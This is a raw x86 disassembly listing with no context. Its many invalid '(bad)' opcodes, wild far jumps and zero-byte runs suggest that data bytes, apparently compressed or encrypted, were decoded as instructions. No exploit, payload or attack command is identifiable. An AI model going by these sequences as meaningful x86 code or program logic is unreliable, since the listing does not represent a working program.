  40cea0:	mov    WORD PTR [ebx],gs
  40cea2:	(bad)  
  40cea3:	cmp    al,0xde
  40cea5:	jb     0x40cef2
  40cea7:	add    BYTE PTR [edi+esi*1-0x2c2e72c6],cl
  40ceae:	cmp    al,0x6a
  40ceb0:	lea    edx,[ecx-0x277395f4]
  40ceb6:	inc    edi
  40ceb7:	mov    al,0xdc
  40ceb9:	xchg   esp,eax
  40ceba:	fld    DWORD PTR [ebx]
  40cebc:	sbb    edi,ecx
  40cebe:	pop    ds
  40cebf:	xor    al,0x63
  40cec1:	lahf   
  40cec2:	xchg   ecx,eax
  40cec3:	aas    
  40cec4:	int    0x94
  40cec6:	jmp    0x49:0x6282dfc3
	...
  40cedd:	add    BYTE PTR [eax],al
  40cedf:	add    BYTE PTR [eax],cl
  40cee1:	xchg   esp,eax
  40cee2:	mov    ebx,0xcfb70f17
  40cee7:	add    eax,eax
  40cee9:	mov    WORD PTR [edx+0x31],gs
  40ceec:	pushf  
  40ceed:	scas   al,BYTE PTR es:[edi]
  40ceee:	es push es
  40cef0:	imul   edx,DWORD PTR [esi+edx*1-0x6aca6baf],0xffffff8b
  40cef8:	sbb    bh,BYTE PTR [edi-0x776734bd]
  40cefe:	xchg   edi,eax
  40ceff:	push   es
  40cf00:	mov    WORD PTR ds:0x381cdc36,fs
  40cf06:	dec    edx
  40cf08:	cli    
  40cf09:	mov    esi,0xd7e1dc23
  40cf0e:	fild   WORD PTR [ebx]
  40cf10:	jmp    0x40ced0
  40cf12:	mov    bh,0xdb
  40cf14:	loope  0x40ced8
  40cf16:	fmulp  st(2),st
  40cf18:	fidivr DWORD PTR [esi-0x3d262451]
  40cf1e:	into   
  40cf1f:	retf   0x4b69
  40cf22:	mov    ds:0x6adfc3f7,al
  40cf27:	xlat   BYTE PTR ds:[ebx]
  40cf28:	push   cs
  40cf29:	push   eax
  40cf2a:	test   al,0x78
  40cf2c:	dec    eax
  40cf2d:	cmp    BYTE PTR [eax],dh
  40cf2f:	pop    esp
  40cf30:	push   0xffffffb1
  40cf32:	and    BYTE PTR [esi+esi*1],al
  40cf35:	(bad)
  40cf39:	data16 add al,BYTE PTR [ebp-0x74]
  40cf3d:	sub    al,0x82
  40cf3f:	sub    BYTE PTR [esp+edx*4+0xc36c],cl
	...
  40cf56:	add    BYTE PTR [eax],al
  40cf58:	xchg   edx,eax
  40cf59:	sbb    al,0x9
  40cf5b:	test   eax,0x6208948f
  40cf60:	mov    esp,0xe4fb8230
  40cf65:	fdiv   st,st(0)
  40cf67:	mov    ecx,0x56f4a956
  40cf6c:	mov    eax,ds:0x56298b90
  40cf71:	sbb    al,0x97
  40cf73:	jmp    0xbcca6407
  40cf78:	push   edi
  40cf79:	xor    al,0x7
  40cf7b:	ins    DWORD PTR es:[edi],dx
  40cf7c:	stos   DWORD PTR es:[edi],eax
  40cf7d:	xor    esi,esi
  40cf7f:	jmp    0xea1da8d2
  40cf84:	(bad)  
  40cf85:	xchg   esp,eax
  40cf86:	or     BYTE PTR [esi],ah
  40cf88:	int3   
  40cf89:	dec    esp
  40cf8a:	or     ecx,ebp
  40cf8c:	(bad)  
  40cf8d:	xchg   esp,eax
  40cf8e:	int    0xa4
  40cf90:	fistp  QWORD PTR [ebx+0x8]
  40cf93:	jmp    0x2d8d2b27
  40cf98:	(bad)  
  40cf99:	xchg   esp,eax
  40cf9a:	or     cl,ch
  40cf9c:	jp     0x40cf66
  40cf9e:	lock (bad) 
  40cfa0:	stc    
  40cfa1:	and    BYTE PTR [ebp+esi*4-0x60],cl
  40cfa5:	and    DWORD PTR [ecx+edi*4-0x68],ecx
  40cfa9:	mov    esi,0x2c4bd607
  40cfae:	idiv   BYTE PTR [ebx]
  40cfb0:	aam    0x9e
  40cfb2:	enter  0x7c3c,0x17
  40cfb6:	je     0x40cf65
  40cfb8:	(bad)
	...
  40cfd0:	push   ebx
  40cfd1:	dec    eax
  40cfd2:	or     DWORD PTR ds:0xa56bc4e,esi
  40cfd8:	dec    edi
  40cfd9:	xchg   esp,eax
  40cfda:	cmc    
  40cfdb:	adc    al,0xdc
  40cfdd:	cmp    esp,esi
  40cfdf:	xor    al,0x90
  40cfe1:	xchg   esp,eax
  40cfe2:	add    DWORD PTR [ecx+0x6e9e3c],ebp
  40cfe8:	cmp    bl,BYTE PTR [eax+0x73fc0008]
  40cfee:	shr    bl,0x6a
  40cff1:	push   esp
  40cff2:	dec    ebp
  40cff3:	enter  0x9765,0x8
  40cff7:	add    dl,dh
  40cff9:	jecxz  0x40cfbb
  40cffb:	(bad)  
  40cffc:	cmp    BYTE PTR [ebx],al
  40cffe:	div    DWORD PTR [ebp+0x6d]
  40d001:	dec    edi
  40d002:	in     al,dx
  40d003:	std    
  40d004:	ret    0xf75d
  40d007:	jne    0x40cfb2
  40d009:	push   eax
  40d00a:	xor    BYTE PTR [ebp+0x35],bl
  40d00d:	xchg   edi,eax
  40d00e:	mov    DWORD PTR [ebp-0x63],edi
  40d011:	cwde   
  40d012:	jl     0x40d01c
  40d014:	(bad)  
  40d016:	shr    al,1
  40d018:	inc    ecx
  40d019:	jp     0x40d023
  40d01b:	add    BYTE PTR [esi-0x54],bh
  40d01e:	adc    BYTE PTR [ebp+0x7d],0xb1
  40d022:	pop    ss
  40d023:	(bad)  
  40d024:	clc    
  40d025:	pop    esi
  40d026:	not    DWORD PTR [edx-0x3]
  40d029:	scas   eax,DWORD PTR es:[edi]
  40d02a:	pop    esp
  40d02b:	cld    
  40d02c:	jle    0x40d058
  40d02e:	div    DWORD PTR [ebp+0x1]
  40d031:	pop    esp
  40d032:	pop    eax
  40d033:	or     BYTE PTR [eax],al
	...
  40d045:	add    BYTE PTR [eax],al
  40d047:	add    BYTE PTR [edx+ebx*2-0x4e57fff6],ch
  40d04e:	loope  0x40cfd3
  40d050:	sub    DWORD PTR [edi],esi
  40d052:	pop    esp
  40d053:	add    DWORD PTR [eax-0x1abe9506],0xffffff96
  40d05a:	jnp    0x40d07a
  40d05c:	cli    
  40d05d:	xor    DWORD PTR [eax+0x7987463],ebp
  40d063:	add    BYTE PTR [ebp+0x46a6b696],ah
  40d069:	xlat   BYTE PTR ds:[ebx]
  40d06a:	or     bl,ch
  40d06c:	mov    edx,0xb726c7b4
  40d071:	pop    ss
  40d072:	int3   
  40d073:	add    cl,BYTE PTR [ebx+eiz*4-0x7773c275]
  40d07a:	fild   DWORD PTR [edx+0x413399c9]
  40d080:	mov    WORD PTR [ebx],?
  40d082:	icebp  
  40d083:	xor    DWORD PTR [edi+0x3c],0xa
  40d087:	add    BYTE PTR [edi],cl
  40d089:	add    DWORD PTR [ebx+ecx*2-0x33],eax
  40d08d:	cmp    ecx,DWORD PTR [edx]
  40d08f:	invd   
  40d091:	loop   0x40d09c
  40d093:	add    BYTE PTR [esi+edi*4-0x3384df2],cl
  40d09a:	or     DWORD PTR [eax],eax
  40d09c:	fwait
  40d09d:	mov    edi,0x3c43ffea
  40d0a2:	leave  
  40d0a3:	inc    esp
  40d0a4:	cmp    BYTE PTR [edx+ecx*1],bh
  40d0a7:	add    BYTE PTR [edx+edi*2+0xf836],cl
	...
  40d0be:	add    BYTE PTR [eax],al
  40d0c0:	mov    WORD PTR [ebx],?
  40d0c2:	or     al,BYTE PTR [eax]
  40d0c4:	adc    ecx,edi
  40d0c6:	int    0x4f
  40d0c8:	or     DWORD PTR [ecx],eax
  40d0ca:	ret    0xa64f
  40d0cd:	cmp    edx,DWORD PTR [edx-0x10]
  40d0d0:	outs   dx,DWORD PTR ds:[esi]
  40d0d1:	cld    
  40d0d2:	or     edi,edi
  40d0d4:	cdq    
  40d0d5:	adc    eax,0x368c4135
  40d0da:	retf   0x80e
  40d0dd:	push   0x9
  40d0df:	add    BYTE PTR [esi+edi*4+0x428cf83f],cl
  40d0e6:	jbe    0x40d093
  40d0e8:	mov    WORD PTR [ebx],?
  40d0ea:	or     al,BYTE PTR [ebx+0xf0d5f51]
  40d0f0:	adc    BYTE PTR [esi],bl
  40d0f2:	or     eax,0x57a68c00
  40d0f7:	cld    
  40d0f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0f9:	mov    ebp,0x898c000c
  40d0fe:	jno    0x40d135
  40d100:	stos   DWORD PTR es:[edi],eax
  40d101:	xchg   esp,eax
  40d102:	adc    eax,0x8fd812ec
  40d107:	(bad)  
  40d108:	and    DWORD PTR [eax-0x4367be92],edx
  40d10e:	dec    ebp
  40d10f:	arpl   bp,cx
  40d111:	xchg   esp,eax
  40d112:	xchg   edi,eax
  40d113:	in     eax,dx
  40d114:	out    0x94,eax
  40d116:	fbstp  TBYTE PTR [ebx+ebx*2+0x502a015]
  40d11d:	xlat   BYTE PTR ds:[ebx]
  40d11e:	jg     0x40d17c
  40d120:	xor    dh,BYTE PTR [ebp+0x3a0]
	...
  40d136:	add    BYTE PTR [eax],al
  40d138:	adc    edx,edi
  40d13a:	dec    ebx
  40d13b:	mov    edi,0x3e040d0
  40d140:	mov    WORD PTR [esp+edx*2-0x263bcbbf],ss
  40d147:	add    al,0xb6
  40d149:	xchg   esp,eax
  40d14a:	fld    DWORD PTR [ebx]
  40d14c:	or     edi,edx
  40d14e:	aas    
  40d14f:	xor    al,0xa6
  40d151:	xchg   esp,eax
  40d152:	push   esp
  40d153:	inc    ecx
  40d154:	sbb    al,0xc4
  40d156:	cs icebp 
  40d158:	fstp   st(4)
  40d15a:	mov    al,ds:0x94548703
  40d15f:	sbb    BYTE PTR [edi],cl
  40d161:	scas   eax,DWORD PTR es:[edi]
  40d162:	repz add eax,DWORD PTR [eax-0x73fab887]
  40d169:	xchg   esp,eax
  40d16a:	(bad)  
  40d16c:	cmp    ebp,DWORD PTR [eax-0x6387392b]
  40d172:	out    0x50,al
  40d174:	hlt    
  40d175:	xor    BYTE PTR [ebp-0x28],dl
  40d178:	loop   0x40d123
  40d17a:	neg    DWORD PTR [ebx-0x70]
  40d17d:	xchg   esp,eax
  40d17e:	into   
  40d17f:	test   ebx,ebp
  40d181:	out    0xd9,al
  40d183:	(bad)  
  40d184:	retf   0x3530
  40d187:	fsubr  DWORD PTR [ebx-0x73fbd5b6]
  40d18d:	ror    BYTE PTR [eax],cl
  40d18f:	mov    dh,0x74
  40d191:	sub    al,0x8a
  40d193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d194:	stos   DWORD PTR es:[edi],eax
  40d195:	adc    eax,0xa88fa174
  40d19a:	jmp    FWORD PTR [ecx+0x0]
	...
  40d1ad:	add    BYTE PTR [eax],al
  40d1af:	add    BYTE PTR [ecx+0x3a6c0594],dl
  40d1b5:	xor    esi,esi
  40d1b7:	mov    ss,WORD PTR [edx-0x57]
  40d1ba:	hlt    
  40d1bb:	xchg   BYTE PTR [edx+esi*4+0x41],bh
  40d1bf:	sub    BYTE PTR [eax+0x73abbfce],dl
  40d1c5:	xor    BYTE PTR [ebp+0x62],bl
  40d1c8:	inc    ebx
  40d1c9:	adc    ecx,ebp
  40d1cb:	popa   
  40d1cc:	lds    edx,FWORD PTR [edx+eiz*2+0xa9530e]
  40d1d3:	inc    ecx
  40d1d4:	ds mov esp,0xd8c84ef5
  40d1da:	hlt    
  40d1db:	push   0xffffff94
  40d1dd:	pop    edx
  40d1de:	inc    edx
  40d1df:	test   al,0x8f
  40d1e1:	xchg   esp,eax
  40d1e2:	jl     0x40d1da
  40d1e4:	repnz fdiv st,st(0)
  40d1e7:	jmp    0xd249667b
  40d1ec:	dec    edi
  40d1ed:	loopne 0x40d247
  40d1ef:	mov    ecx,0xbbf0c894
  40d1f4:	dec    edx
  40d1f5:	mov    edx,eax
  40d1f7:	mov    ds:0x298b9450,al
  40d1fc:	push   eax
  40d1fd:	xchg   edx,eax
  40d1fe:	loope  0x40d1ca
  40d200:	push   cs
  40d201:	mov    cl,0xf0
  40d203:	jmp    0xd3226464
  40d208:	inc    edi
  40d209:	add    eax,0x2f8829aa
  40d20e:	jl     0x40d1f1
  40d210:	shr    DWORD PTR [eax+0xc100],1
	...
  40d226:	add    BYTE PTR [eax],al
  40d228:	cmp    eax,0x45cef62d
  40d22d:	enter  0xf0,0x3e
  40d231:	and    dh,bh
  40d233:	jne    0x40d202
  40d235:	pop    ecx
  40d236:	pop    eax
  40d237:	or     dl,bh
  40d239:	fild   WORD PTR [eax]
  40d23b:	call   0x3829a2
  40d240:	jmp    0xf756:0x4de800df
  40d247:	(bad)  
  40d248:	cli    
  40d249:	fcomip st,st(4)
  40d24b:	jmp    DWORD PTR [eax-0x662c11d0]
  40d251:	pop    ecx
  40d252:	test   ecx,0x55089427
  40d258:	out    dx,al
  40d259:	dec    esp
  40d25a:	mov    eax,esp
  40d25c:	in     eax,0x7e
  40d25e:	pop    ebp
  40d25f:	push   ebx
  40d260:	fidivr WORD PTR [edi+0x4]
  40d263:	(bad)  
  40d264:	addr16 xchg ebx,eax
  40d266:	or     BYTE PTR [eax],al
  40d268:	gs pop eax
  40d26a:	jge    0x40d274
  40d26c:	int    0x27
  40d26e:	push   eax
  40d26f:	add    BYTE PTR ds:0x201fe14,dh
  40d275:	sub    ah,BYTE PTR [ebx]
  40d277:	rcr    BYTE PTR [esi],0x78
  40d27a:	push   esi
  40d27b:	leave  
  40d27c:	ja     0x40d2ae
  40d27e:	not    al
  40d280:	jge    0x40d22f
  40d282:	pop    esp
  40d283:	or     al,0x9c
  40d285:	xchg   edx,eax
  40d286:	sbb    eax,0xd0152a
	...
  40d2a0:	cmc    
  40d2a1:	xchg   edx,eax
  40d2a2:	xor    DWORD PTR [ebp-0x3],0x9e0874ab
  40d2a9:	jp     0x40d319
  40d2ab:	mov    esp,ebx
  40d2ad:	adc    dh,dl
  40d2af:	xor    BYTE PTR [edi+0x2d],ah
  40d2b2:	jbe    0x40d2b0
  40d2b4:	lods   al,BYTE PTR ds:[esi]
  40d2b5:	loope  0x40d2c2
  40d2b7:	or     cl,0x82
  40d2ba:	loope  0x40d2d7
  40d2bc:	mov    WORD PTR [ebp+0x503e40cd],?
  40d2c2:	mov    bh,bl
  40d2c4:	dec    edx
  40d2c5:	outs   dx,BYTE PTR ds:[esi]
  40d2c6:	hlt    
  40d2c7:	jg     0x40d271
  40d2c9:	jnp    0x40d257
  40d2cb:	ret    
  40d2cc:	xchg   BYTE PTR [edx-0xd],dl
  40d2cf:	sub    cl,ah
  40d2d1:	sub    DWORD PTR [ebx],0xf1fad55e
  40d2d7:	call   DWORD PTR [edi+0x4d]
  40d2da:	pop    eax
  40d2db:	or     BYTE PTR [eax+0x44],dl
  40d2de:	inc    ebp
  40d2df:	add    al,0xb8
  40d2e1:	dec    ebx
  40d2e2:	rcl    DWORD PTR [esi],1
  40d2e4:	sar    BYTE PTR [edx+ebx*2+0xa],0xb8
  40d2e9:	jne    0x40d32e
  40d2eb:	push   es
  40d2ec:	mov    al,ds:0x770a087c
  40d2f1:	xor    eax,0x56c7c011
  40d2f6:	sub    al,0xc9
  40d2f8:	dec    esi
  40d2f9:	and    al,0xa
  40d2fb:	shr    BYTE PTR [eax+eax*2-0x10],0xc3
  40d300:	div    dl
  40d302:	mov    ch,al
	...
  40d318:	mov    fs,WORD PTR [edx]
  40d31a:	mov    eax,ds:0x36a2ee74
  40d31f:	or     al,0x33
  40d321:	sub    al,0x7d
  40d323:	inc    esp
  40d324:	and    al,0x7f
  40d326:	inc    esi
  40d327:	or     BYTE PTR [ebx],dl
  40d329:	add    esi,ecx
  40d32b:	(bad)  
  40d32c:	rol    DWORD PTR [edi+0x3b8c0009],1
  40d332:	mov    DWORD PTR [esi+edi*1],edi
  40d335:	repz dec edx
  40d337:	add    BYTE PTR [edi+ebp*4+0x2b518d23],cl
  40d33e:	cmp    ebp,DWORD PTR [edx-0x73]
  40d341:	adc    DWORD PTR [edx],ecx
  40d343:	push   0xffffff8c
  40d345:	adc    DWORD PTR [edx],ecx
  40d347:	push   0xffffff8c
  40d349:	xchg   esp,eax
  40d34a:	jl     0x40d395
  40d34c:	aam    0xc4
  40d34e:	(bad)  
  40d34f:	sbb    DWORD PTR [esi],ebx
  40d351:	fisub  DWORD PTR [eax]
  40d353:	add    al,0x97
  40d355:	push   esp
  40d356:	pop    esp
  40d357:	dec    BYTE PTR [esi]
  40d359:	mov    al,0xb3
  40d35b:	add    al,0x40
  40d35d:	push   0x1980497a
  40d362:	sub    eax,0x3e9c66b4
  40d367:	out    dx,al
  40d368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d369:	sbb    DWORD PTR ds:0xf7b006b8,edx
  40d36f:	mov    es,WORD PTR [eax+0x24]
  40d372:	add    DWORD PTR [esi],0x7f
  40d375:	clc    
  40d376:	push   0x49
  40d378:	nop
  40d379:	sub    eax,0xb3f5
	...
  40d38e:	add    BYTE PTR [eax],al
  40d390:	or     dl,BYTE PTR [esi+esi*2-0x4bc387c7]
  40d397:	pop    esp
  40d398:	mov    WORD PTR [edi+esi*1-0x206b73fb],ss
  40d39f:	pop    esi
  40d3a0:	mov    ebx,0x8bc638ce
  40d3a5:	xchg   esp,eax
  40d3a6:	or     al,ah
  40d3a8:	out    0xcd,al
  40d3aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3ab:	int3   
  40d3ac:	dec    ebp
  40d3ad:	pushf  
  40d3ae:	fistp  WORD PTR [eax+0x7]
  40d3b1:	inc    eax
  40d3b2:	arpl   ax,cx
  40d3b4:	repz mov ebx,0x2d2be3df
  40d3ba:	dec    eax
  40d3bb:	add    dh,BYTE PTR [edx-0x2f72d0d3]
  40d3c1:	xor    BYTE PTR [eax-0x206b93fd],bl
  40d3c7:	stos   DWORD PTR es:[edi],eax
  40d3c8:	mov    esp,0x14c306be
  40d3cd:	xlat   BYTE PTR ds:[ebx]
  40d3ce:	pop    es
  40d3cf:	sub    al,0x8c
  40d3d1:	je     0x40d3b2
  40d3d3:	add    esp,esp
  40d3d5:	ja     0x40d3df
  40d3d7:	xchg   esi,ecx
  40d3d9:	sub    eax,0xb51ba480
  40d3de:	or     BYTE PTR [ecx],cl
  40d3e0:	nop
  40d3e1:	xchg   esp,eax
  40d3e2:	loopne 0x40d3da
  40d3e4:	popf   
  40d3e5:	sub    eax,0x245460f6
  40d3ea:	popa   
  40d3eb:	jmp    0xd237009f
  40d3f0:	mov    DWORD PTR [esi+0xbef5],edi
	...
  40d406:	add    BYTE PTR [eax],al
  40d408:	add    al,bl
  40d40a:	in     al,0x41
  40d40c:	nop
  40d40d:	je     0x40d417
  40d40f:	jmp    0xa6a5040b
  40d414:	into   
  40d415:	sbb    ecx,DWORD PTR [ecx+edx*4+0x67]
  40d419:	xchg   esp,eax
  40d41a:	sub    cl,ch
  40d41c:	(bad)  
  40d41d:	cmp    al,0xf9
  40d41f:	cld    
  40d420:	dec    esi
  40d421:	sub    eax,DWORD PTR [eax+0x7c2b242c]
  40d427:	fldenv [edi-0x6fd79387]
  40d42d:	sub    edi,DWORD PTR [ebp+ebp*2+0x37]
  40d431:	dec    esp
  40d432:	push   eax
  40d433:	jmp    0xee0debc7
  40d438:	dec    esi
  40d439:	mov    eax,ds:0xb0cfc118
  40d43e:	inc    edi
  40d43f:	jmp    0x52317592
  40d444:	pop    esp
  40d445:	int    0x8
  40d447:	jmp    0x36462c56
  40d44c:	test   BYTE PTR fs:[eax-0x6c],ah
  40d450:	imul   edx,ebp,0x8
  40d453:	es push esp
  40d455:	and    cl,ah
  40d457:	arpl   WORD PTR [eax-0x2c95f76c],si
  40d45d:	lahf   
  40d45e:	cmc    
  40d45f:	xchg   esp,eax
  40d460:	lahf   
  40d461:	mov    esp,0xd109007c
  40d466:	or     bh,bh
  40d468:	js     0x40d451
  40d46a:	in     eax,dx
  40d46b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  40d480:	cld    
  40d481:	xchg   edi,eax
  40d482:	or     BYTE PTR [ebx+0x75f59ba9],al
  40d488:	aad    0x7f
  40d48a:	lea    esp,[esp+eiz*4-0x70]
  40d48e:	cmc    
  40d48f:	jne    0x40d462
  40d491:	clc    
  40d492:	cdq    
  40d493:	pop    ecx
  40d494:	mov    ch,0x97
  40d496:	mov    esp,eax
  40d498:	rcl    DWORD PTR [ebp+edi*2+0xc],0x5d
  40d49d:	or     ebp,DWORD PTR [edx+0x41]
  40d4a0:	mov    ch,0x54
  40d4a2:	jge    0x40d48c
  40d4a4:	int    0x17
  40d4a6:	push   ecx
  40d4a7:	add    BYTE PTR [ebp-0xdf335f0],ah
  40d4ad:	arpl   WORD PTR [eax],bx
  40d4af:	push   0x477ccc
  40d4b4:	adc    ah,BYTE PTR [ebx-0x14]
  40d4b7:	call   0x49a45f
  40d4bc:	out    0x5c,al
  40d4be:	add    ch,BYTE PTR [edx+0x75]
  40d4c1:	push   esp
  40d4c2:	jge    0x40d4c0
  40d4c4:	repnz arpl WORD PTR [edi+edi*8],ax
  40d4c8:	js     0x40d512
  40d4ca:	dec    esi
  40d4cb:	inc    ecx
  40d4cc:	call   FWORD PTR gs:[ebx+0x70]
  40d4d0:	loop   0x40d527
  40d4d2:	add    DWORD PTR [ebp-0x2b],0xf8ff087a
  40d4d9:	out    dx,al
  40d4da:	div    BYTE PTR [ebp+0x21]
  40d4dd:	push   esp
  40d4de:	cmp    eax,0x8d5edd8
  40d4e3:	call   0x40d4e8
	...
  40d4f8:	cmc    
  40d4f9:	data16 cmc 
  40d4fb:	call   FWORD PTR [ebx+edx*8+0x54256ad4]
  40d502:	jge    0x40d4f8
  40d504:	mov    WORD PTR [edx+0x40030c3d],es
  40d50a:	rol    BYTE PTR [edi+0x4d],cl
  40d50d:	cmp    eax,0x2a7c29a2
  40d512:	leave  
  40d513:	mov    BYTE PTR [ecx-0x7b],dl
  40d516:	es add bl,ah
  40d519:	lahf   
  40d51a:	mov    ecx,0xc94561fe
  40d51f:	xor    al,0xb4
  40d521:	fs dec ecx
  40d523:	add    BYTE PTR [eax+ebp*1-0x4c3c00c6],dh
  40d52a:	dec    esi
  40d52b:	aam    0x26
  40d52d:	cmp    eax,0xe9a074c9
  40d532:	ds call 0x4812fce3
  40d538:	dec    ebp
  40d539:	cmp    eax,0xf22bfda2
  40d53e:	enter  0x4988,0xed
  40d542:	xchg   BYTE PTR [esp+ecx*2+0x6c],al
  40d546:	(bad)  
  40d547:	je     0x40d5b1
  40d549:	sbb    edi,DWORD PTR [edi]
  40d54b:	or     al,0x7b
  40d54d:	jmp    0x3c0e1d23
  40d552:	mov    ds:0xc8a2fbe5,al
  40d557:	mov    cl,cl
  40d559:	pop    es
  40d55a:	lea    edi,[eax+eax*1+0x0]
	...
  40d56e:	add    BYTE PTR [eax],al
  40d570:	ins    BYTE PTR es:[edi],dx
  40d571:	cmp    al,0x19
  40d573:	test   BYTE PTR [ebx],bl
  40d575:	cmp    al,0xa
  40d577:	add    BYTE PTR [edi],cl
  40d579:	inc    ecx
  40d57a:	fdivp  st(7),st
  40d57c:	xchg   edx,eax
  40d57d:	scas   eax,DWORD PTR es:[edi]
  40d57e:	data16 (bad) 
  40d580:	cmp    edi,DWORD PTR [ecx*4+0x193c5c7c]
  40d587:	test   bh,ch
  40d589:	cmp    ecx,DWORD PTR [edx]
  40d58b:	add    BYTE PTR [ecx],dl
  40d58d:	icebp  
  40d58e:	int    0x4f
  40d590:	sbb    edx,DWORD PTR [ebp-0x3ad4286c]
  40d596:	adc    al,0xc0
  40d598:	or     bl,BYTE PTR [esi+0x1a08101f]
  40d59e:	loopne 0x40d5a3
  40d5a0:	mov    WORD PTR ds:0x9af3c78d,ss
  40d5a6:	imul   eax,DWORD PTR [esi-0x711fd615],0x48
  40d5ad:	pop    esp
  40d5ae:	nop
  40d5af:	shl    BYTE PTR [eax+0x44],0xd8
  40d5b3:	repnz shr BYTE PTR [ecx],1
  40d5b6:	xlat   BYTE PTR ds:[ebx]
  40d5b7:	or     ecx,esp
  40d5b9:	mov    al,ds:0x5c408354
  40d5be:	loopne 0x40d5f7
  40d5c0:	sub    edi,DWORD PTR [edi+ecx*8-0x49155cfd]
  40d5c7:	cmp    DWORD PTR [esp+edi*1+0x29a32cdd],edx
  40d5ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5cf:	cmp    DWORD PTR [ecx+ebp*1+0xc15],ebp
	...
  40d5e6:	add    BYTE PTR [eax],al
  40d5e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5e9:	mov    al,ds:0x298abf18
  40d5ee:	adc    eax,0xe79f82e0
  40d5f3:	stos   DWORD PTR es:[edi],eax
  40d5f4:	in     al,0xbb
  40d5f6:	mov    ?,WORD PTR [edi-0x4058608e]
  40d5fc:	loopne 0x40d59a
  40d5fe:	xchg   DWORD PTR [esi-0xb],ebx
  40d601:	sub    DWORD PTR [edi-0x41],esp
  40d604:	loopne 0x40d656
  40d606:	outs   dx,DWORD PTR ds:[esi]
  40d607:	cmp    DWORD PTR [eax],edi
  40d609:	sub    ebp,ebx
  40d60b:	or     esi,DWORD PTR [eax+esi*2]
  40d60e:	enter  0x42be,0x29
  40d612:	(bad)  
  40d614:	cmp    bl,BYTE PTR [edi-0x634740f1]
  40d61a:	push   edi
  40d61b:	push   ss
  40d61c:	mov    ch,0x29
  40d61e:	or     DWORD PTR [esi],esi
  40d620:	push   gs
  40d622:	(bad)  
  40d623:	jmp    0xa4ca558b
  40d628:	dec    edi
  40d629:	xchg   ebp,eax
  40d62a:	jnp    0x40d61a
  40d62c:	push   ss
  40d62d:	rol    ah,1
  40d62f:	push   ss
  40d630:	clc    
  40d631:	sub    DWORD PTR [ecx+eiz*8+0x27],edi
  40d635:	push   edx
  40d636:	popa   
  40d637:	push   es
  40d638:	xor    edi,DWORD PTR [esi]
  40d63a:	add    edx,DWORD PTR [ebx-0x1e83d671]
  40d640:	aaa    
  40d641:	out    dx,al
  40d642:	pusha  
  40d643:	out    dx,al
  40d644:	sbb    ch,BYTE PTR [edx]
  40d646:	jl     0x40d62d
  40d648:	daa    
  40d649:	xchg   ebx,eax
  40d64a:	fiadd  WORD PTR fs:[eax]
	...
  40d65d:	add    BYTE PTR [eax],al
  40d65f:	add    BYTE PTR [edx],cl
  40d661:	sub    bh,BYTE PTR [ecx+edx*8-0x9]
  40d665:	sub    ah,BYTE PTR [edx-0x32]
  40d668:	cli    
  40d669:	sub    DWORD PTR [ebp+edi*4-0x19],edi
  40d66d:	and    ah,BYTE PTR [edx-0x42]
  40d670:	jmp    0x623a:0xf7b97c29
  40d677:	scas   al,BYTE PTR es:[edi]
  40d678:	fisubr DWORD PTR [ecx]
  40d67a:	jl     0x40d611
  40d67c:	out    0x32,eax
  40d67e:	bound  ebx,QWORD PTR [esi-0x7e83d8b6]
  40d684:	aaa    
  40d685:	dec    esi
  40d686:	bound  ecx,QWORD PTR [esi-0x7283d8c6]
  40d68c:	daa    
  40d68d:	inc    esi
  40d68e:	bound  edi,QWORD PTR [esi+0x2a]
  40d691:	daa    
  40d692:	jl     0x40d61d
  40d694:	aaa    
  40d695:	pop    esi
  40d696:	bound  ebp,QWORD PTR [esi+0x1a]
  40d699:	daa    
  40d69a:	jl     0x40d6e1
  40d69c:	daa    
  40d69d:	push   esi
  40d69e:	bound  ebx,QWORD PTR [esi+0xa]
  40d6a1:	daa    
  40d6a2:	jl     0x40d6d5
  40d6a4:	imul   ebp
  40d6a6:	popa   
  40d6a7:	dec    esi
  40d6a8:	cli    
  40d6a9:	es jl  0x40d6ac
  40d6ac:	xchg   ecx,eax
  40d6ad:	sti    
  40d6ae:	mov    bh,0x6b
  40d6b0:	push   0xffffffe6
  40d6b2:	div    BYTE PTR [ebp-0x7b]
  40d6b5:	sti    
  40d6b6:	lahf   
  40d6b7:	imul   ebp,DWORD PTR [edx-0x1a],0xfffffff6
  40d6bb:	jne    0x40d716
  40d6bd:	sti    
  40d6be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6bf:	imul   ebp,DWORD PTR [edx+0xc2c0e6],0x0
	...
  40d6d6:	add    BYTE PTR [eax],al
  40d6d8:	jmp    0xf9cc3270
  40d6dd:	adc    ecx,edx
  40d6df:	call   0x8e37c0d6
  40d6e4:	xor    al,ch
  40d6e6:	inc    ebp
  40d6e7:	jmp    DWORD PTR [eax-0x69]
  40d6ea:	cmc    
  40d6eb:	xor    eax,0x47db7d
  40d6f0:	mov    ebp,0xb5005e9f
  40d6f5:	pushf  
  40d6f6:	enter  0x300f,0x8c
  40d6fa:	pop    es
  40d6fb:	add    BYTE PTR [ebp-0x5a07b2b0],ah
  40d701:	xchg   ebx,eax
  40d702:	or     BYTE PTR [eax],al
  40d704:	repnz iret 
  40d706:	cld    
  40d707:	push   DWORD PTR [edx-0x5a95f76d]
  40d70d:	jge    0x40d717
  40d70f:	push   0xffffffa5
  40d711:	jge    0x40d71b
  40d713:	lea    esi,[eax-0xf72ba14]
  40d719:	loopne 0x40d719
  40d71b:	dec    DWORD PTR [edx]
  40d71d:	shl    ch,0x75
  40d720:	or     eax,0xfdfc7ce9
  40d725:	adc    BYTE PTR [edi+0x0],bl
  40d728:	jne    0x40d6c6
  40d72a:	enter  0x7074,0xfa
  40d72e:	fiadd  WORD PTR [eax]
  40d730:	gs xchg ebx,eax
  40d732:	pusha  
  40d733:	mov    ah,0xfd
  40d735:	ror    DWORD PTR [eax],1
  40d737:	dec    DWORD PTR [eax+ecx*2+0xe806]
	...
  40d74e:	add    BYTE PTR [eax],al
  40d750:	push   esp
  40d751:	out    0xb4,eax
  40d753:	(bad)  
  40d754:	fsub   QWORD PTR [edx+0x6d118cdc]
  40d75a:	mov    ebx,0x580d23fe
  40d75f:	call   0xfef5bea8
  40d764:	add    eax,0xbf6a4b8
